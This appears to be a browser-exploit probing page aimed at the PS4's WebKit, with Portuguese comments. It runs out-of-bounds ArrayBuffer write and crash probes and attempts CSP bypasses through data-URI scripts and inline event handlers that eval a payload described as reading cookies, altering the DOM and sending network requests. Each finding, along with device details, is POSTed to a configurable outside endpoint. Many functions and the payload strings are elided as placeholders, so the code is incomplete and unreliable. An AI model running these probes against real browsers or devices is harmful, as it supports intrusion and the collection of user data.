<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Vulnerability Scanner | POC + Direct Impact + Notification</title>
    <style>
        /* Estilos CSS permanecem os mesmos */
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { background: #111; border: 1px solid #333; padding: 15px; height: 600px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; }
        #browserInfo { margin-bottom: 15px; border: 1px solid #555; padding: 10px; }
        button { background: #f44336; color: white; border: none; padding: 8px 15px; margin: 5px; border-radius: 3px; }
        select { background: #222; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
        .success { color: #4CAF50; }
        .danger { color: #f44336; }
        .warning { color: #FFC107; }
        .info { color: #2196F3; }
        .section { color: #9C27B0; font-weight: bold; margin: 10px 0; }
        .poc-potential { color: #FF9800; font-weight: bold; }
        .defense-bypass { color: #00BCD4; font-weight: bold; }
        .privilege-escalation { color: #FF4081; font-weight: bold; }
        .impact { color: #E91E63; font-style: italic; }
        .notification { color: #7B1FA2; font-style: italic; } /* Classe para logs de notificação */
    </style>
</head>
<body>
    <h1>PS4 WebKit Vulnerability Scanner | POC + Direct Impact + Notification</h1>

    <div id="browserInfo">
        <strong>User Agent:</strong> <span id="userAgent"></span><br>
        <strong>Platform:</strong> <span id="platform"></span><br>
        <strong>Notification Endpoint:</strong> <span id="notificationEndpointDisplay"></span>
    </div>

    <div>
        <select id="testSelector">
            <option value="all_aggressive">Run All Aggressive Tests (Direct Impact + Notify)</option>
            <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
            <option value="oob_impact_tests">OOB Impact Demonstration Tests</option>
            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts (Direct Impact + Notify)</option>
        </select>
        <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
        <button onclick="clearLog()">Clear Log</button>
    </div>

    <div id="log"></div>

<script>
// ======================
// CONFIGURAÇÃO IMPORTANTE!
// ======================
// SUBSTITUA ESTA URL PELO SEU ENDPOINT PARA RECEBER AS NOTIFICAÇÕES
// Exemplo usando httpbin (ele apenas ecoa o POST): 'https://httpbin.org/post'
// Use um serviço como Beeceptor.com ou seu próprio servidor.
const NOTIFICATION_ENDPOINT = 'https://httpbin.org/post'; // <-- MUDE AQUI!

// ======================
// Coleta de Informações e Logging
// ======================
document.addEventListener('DOMContentLoaded', function() {
    // ... (código de userAgent/platform idêntico) ...
    const endpointDisplay = document.getElementById('notificationEndpointDisplay');
    if(endpointDisplay) endpointDisplay.textContent = NOTIFICATION_ENDPOINT;
});
function log(message, type = '') { /* ... código idêntico ... */ }
function clearLog() { /* ... código idêntico ... */ }

// Flag global APENAS para OOB
var potentialVulnsFound = {
    oobWrite: false
};

// ======================
// Função para Enviar Notificação
// ======================
async function sendVulnerabilityNotification(payload) {
    log(`[NOTIFY] Sending notification for: ${payload.vulnerability}...`, 'notification info');
    try {
        const response = await fetch(NOTIFICATION_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                finding: payload // O objeto com os detalhes da vulnerabilidade
            }),
            mode: 'cors' // Geralmente necessário para endpoints de terceiros
        });

        if (response.ok) {
            log(`[NOTIFY] Notification sent successfully to ${NOTIFICATION_ENDPOINT}. Status: ${response.status}`, 'notification success');
            // const responseData = await response.json(); // Opcional: logar resposta do endpoint (útil com httpbin)
            // console.log("Notification Response:", responseData);
        } else {
            log(`[NOTIFY] Failed to send notification. Status: ${response.status}`, 'notification danger');
        }
    } catch (error) {
        log(`[NOTIFY] Error sending notification: ${error.message}`, 'notification danger');
        console.error("Notification Fetch Error:", error);
    }
}


// ======================
// Funções Auxiliares para Demonstração de Impacto (globais, sem alterações)
// ======================
function demonstrateCookieRead() { /* ... código idêntico ... */ }
function demonstrateDomManipulation() { /* ... código idêntico ... */ }
function demonstrateNetworkRequest() { /* ... código idêntico ... */ }


// ======================
// Aggressive POC Tests (Com Notificações Integradas)
// ======================
const aggressiveTests = {

    // --- Teste OOB Original ---
    "oob_write_aggressive": async function() {
        log("[EXPLOIT] Aggressive ArrayBuffer OOB Write Investigation...", "info");
        potentialVulnsFound.oobWrite = false;
        // ... (setup idêntico: bufferSize, buffer, view, writeValue, offsets, readOffsets) ...
        const bufferSize = 32; /*...*/ const view = new Uint8Array(new ArrayBuffer(bufferSize)); /*...*/

        for (const writeOffset of offsets) {
            // ... (log de tentativa idêntico) ...
            try {
                view[writeOffset] = writeValue;
                log(`⚠️ OOB write at offset ${writeOffset} successful (no error).`, "warning");
                 potentialVulnsFound.oobWrite = true;
                 // NOTIFICAÇÃO: Sucesso na escrita OOB (pode ser muito verboso, talvez comentar?)
                 // sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_SUCCESS', details: `Write at offset ${writeOffset} did not error.` });

                for (const readOffset of readOffsets) {
                    try {
                        // ... (leitura idêntica) ...
                        const readValue = view[readOffset]; /*...*/

                        if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && (writeOffset >= bufferSize || writeOffset < 0)) {
                            const detailMsg = `Wrote at ${writeOffset}, read 0x${readValue.toString(16)} at IN-BOUNDS offset ${readOffset}.`;
                            log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 Potential OOB Write Corruption: ${detailMsg}</span>`, "danger");
                            // <<< NOTIFICAÇÃO AQUI >>>
                            sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_CORRUPTION', details: detailMsg });
                        }
                    } catch (readError) { /* ... log de erro de leitura ... */ }
                }
            } catch (writeError) { /* ... log de erro de escrita ... */ }
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        log("[OOB-AGG] Completed aggressive OOB write testing.", "info");
        // ... (catch de erro geral idêntico) ...
    },

    // --- Testes de Impacto OOB ---
    "test_oob_metadata": async function() {
        log("[IMPACT-OOB] Attempting OOB write to corrupt metadata (e.g., length)...", "section");
        // ... (check da flag oobWrite idêntico) ...
        try {
            // ... (setup idêntico: buffer, view, initialLength, suspectOffsets, writeValue) ...
            const bufferSize = 32; /*...*/ const buffer = new ArrayBuffer(bufferSize); /*...*/

            for(const offset of suspectOffsets) {
                try {
                    // ... (tentativa de escrita OOB idêntica) ...
                    view[offset] = writeValue; /*...*/
                    const currentLength = buffer.byteLength; /*...*/
                    if (currentLength !== initialLength) {
                        const detailMsg = `Buffer length changed from ${initialLength} to ${currentLength} after OOB write at offset ${offset}!`;
                        log(`<span class="poc-potential privilege-escalation impact">🚨 Potential Metadata Corruption: ${detailMsg}</span>`, "danger impact");
                        // <<< NOTIFICAÇÃO AQUI >>>
                        sendVulnerabilityNotification({ vulnerability: 'OOB_METADATA_CORRUPTION', details: detailMsg });
                        // ... (tentativa de acesso com tamanho corrompido idêntica) ...
                        return;
                    }
                } catch(e_write) { /* ... log de erro de escrita ... */ }
            }
             log("[IMPACT-OOB] Metadata corruption test finished, no length change detected.", "info");
        } catch (e) { /* ... catch geral idêntico ... */ }
    },

    "test_oob_crash_probe": async function() {
         // Não há um ponto claro para enviar notificação ANTES do crash.
         // O próprio crash é a evidência. Poderia enviar uma notificação
         // *antes* de tentar um write perigoso, mas isso não confirma o crash.
        log("[IMPACT-OOB] Attempting OOB writes with large offsets/values to probe for crashes...", "section");
         // ... (check da flag e código principal idêntico) ...
         // Nenhuma notificação automática adicionada aqui. O crash é o resultado.
    },


    // --- Teste CSP (Modificado para Impacto Direto e Notificação) ---
     "csp_bypass_aggressive": async function() {
        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (Direct Impact + Notify)...", "info");

        // ---- Preparar Payloads de Impacto (idêntico) ----
        const impactPayloadJsString = `...`; // Mesma string JS
        let impactPayloadBase64 = ''; try { impactPayloadBase64 = btoa(impactPayloadJsString); } catch (e) { /*...*/ } // Mesmo Base64
        const impactPayloadInlineString = `...`; // Mesma string inline

        // ---- Fontes a Testar (idêntico) ----
        const scriptSources = [ `data:text/javascript;base64,${impactPayloadBase64}`, /*...*/ ];

        // ---- Teste com <script src="..."> ----
        for (const src of scriptSources) {
            // ... (log de tentativa idêntico) ...
            await new Promise(resolve => {
                 const script = document.createElement('script');
                 const cleanup = () => { /*...*/ };
                 script.onerror = () => { /*...*/ };

                 script.onload = () => {
                     const successMsg = `Script loaded from ${src.substring(0,30)}...`;
                     log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass Possible & Impact Executed: ${successMsg}</span>`, "danger impact");
                     // <<< NOTIFICAÇÃO AQUI (para Data URI) >>>
                     if (src.startsWith('data:')) {
                          sendVulnerabilityNotification({
                              vulnerability: 'CSP_BYPASS_DATA_URI',
                              details: successMsg,
                              impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED']
                          });
                     }
                     // Outros src que carregarem (improvável com CSP) também notificariam aqui
                     else {
                         sendVulnerabilityNotification({ vulnerability: 'CSP_BYPASS_OTHER_SRC', details: successMsg });
                     }
                     cleanup();
                 };
                 try { /* ... (mesmo código try/catch para set src/append) ... */ } catch(e) { /*...*/ }
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }

        // ---- Teste com script inline em atributos de evento ----
        log("[CSP-AGG] Attempting inline script injection via event attributes (Direct Impact + Notify)...", "info");
        const eventAttributes = ['onerror', 'onload'];

        for (const attr of eventAttributes) {
            log(`[CSP-AGG] Setting up inline test for ${attr}...`, "info");
            await new Promise(async resolve => {
                const testElement = document.createElement('img');
                let bypassDetected = false;
                const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;

                window[uniqueWrapperName] = () => { // Esta função é chamada pelo evento se o bypass funcionar
                     if (!bypassDetected) {
                         const successMsg = `Inline script via ${attr} triggered!`;
                         log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass Possible & Impact Executed: ${successMsg}</span>`, "danger impact");
                         bypassDetected = true;
                         // <<< NOTIFICAÇÃO AQUI (para Inline) >>>
                         sendVulnerabilityNotification({
                             vulnerability: 'CSP_BYPASS_INLINE',
                             event_handler: attr, // Informa qual evento funcionou
                             details: successMsg,
                             impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED']
                         });
                     }
                     try {
                        // Executar o payload de impacto real
                        eval(impactPayloadInlineString.replace(/&quot;/g, '"'));
                     } catch(evalError) { /*...*/ }
                     console.log(`Inline payload potentially executed via ${attr}`);
                };

                const inlineCode = `try { window['${uniqueWrapperName}'](); } catch(e) { console.error('Error in inline wrapper execution:', e); }`;
                testElement.setAttribute(attr, inlineCode);

                // ... (disparar eventos e limpeza idênticos) ...
                if (attr === 'onerror') { testElement.src = 'invalid-image-source-' + Math.random(); }
                else if (attr === 'onload') { testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; }
                document.body.appendChild(testElement);
                await new Promise(resolve => setTimeout(resolve, 500));
                if (!bypassDetected) { /*...*/ }
                try { document.body.removeChild(testElement); } catch(e){}
                delete window[uniqueWrapperName];
                resolve();
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }
        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact + Notify).", "info");
    },

    // --- Executor Principal (Atualizado) ---
    "all_aggressive": async function() { /* ... código idêntico ao anterior ... */ },
    "oob_impact_tests": async function() { /* ... código idêntico ao anterior ... */ }
};

// ======================
// Test Runner (Atualizado)
// ======================
async function runSelectedTest() { /* ... código idêntico ao anterior ... */ }

</script>
</body>
</html>
